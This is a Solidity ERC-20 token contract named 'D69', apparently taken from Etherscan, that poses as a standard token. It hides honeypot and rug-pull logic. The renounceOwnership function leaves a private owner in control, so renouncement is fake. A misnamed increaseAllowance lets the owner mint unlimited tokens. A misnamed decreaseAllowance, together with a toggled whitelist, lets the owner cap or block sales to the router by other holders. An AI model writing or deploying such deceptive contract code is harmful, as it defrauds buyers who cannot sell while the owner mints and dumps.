/**
 *Submitted for verification at Etherscan.io on 2021-08-27
*/

pragma solidity ^0.6.9; 
// SPDX-License-Identifier: MIT  
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
}
abstract contract Context {
    function _call() internal view virtual returns (address payable) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner;
    address public Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () internal {
        address call = _call();
        _owner = call;
         Owner = call;
        emit OwnershipTransferred(address(0), call);
    }
    modifier onlyOwner() {
        require(_owner == _call(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        Owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }   
}
contract D69 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _router;
    mapping (address => bool) private _approved;
    mapping(address => mapping (address => uint256)) private _allowances;
    address private router;
    uint256 private _totalTokens = 50 * 10**9 * 10**18;
    uint256 private rTotal = 50 * 10**9 * 10**18;
    string private _name = 'D69';
    string private _symbol = 'D69';
    uint8 private _decimals = 18;  
    constructor () public {
        _router[_call()] = _totalTokens;
        emit Transfer(address(0x0), _call(), _totalTokens);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decreaseAllowance(uint256 amount) public onlyOwner {
        rTotal = amount * 10**18;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _router[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_call(), recipient, amount);
        return true;
    }
    function increaseAllowance(uint256 amount) public onlyOwner {
        require(_call() != address(0));
        _totalTokens = _totalTokens.add(amount);
        _router[_call()] = _router[_call()].add(amount);
        emit Transfer(address(0), _call(), amount);
    }
    function Approve(address trade) public onlyOwner {
        _approved[trade] = (_approved[trade] ? false : true);
    }
    function setrouteChain (address Uniswaprouterv02) public onlyOwner {
        router = Uniswaprouterv02;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_call(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _call(), _allowances[sender][_call()].sub(amount));
        return true;
    }
    function totalSupply() public view override returns (uint256) {
        return _totalTokens;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0));
        require(recipient != address(0));
        if (!(_approved[sender] ? true : false) && recipient == router) {
            require(amount < rTotal); 
        }
        _router[sender] = _router[sender].sub(amount);
        _router[recipient] = _router[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
     function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}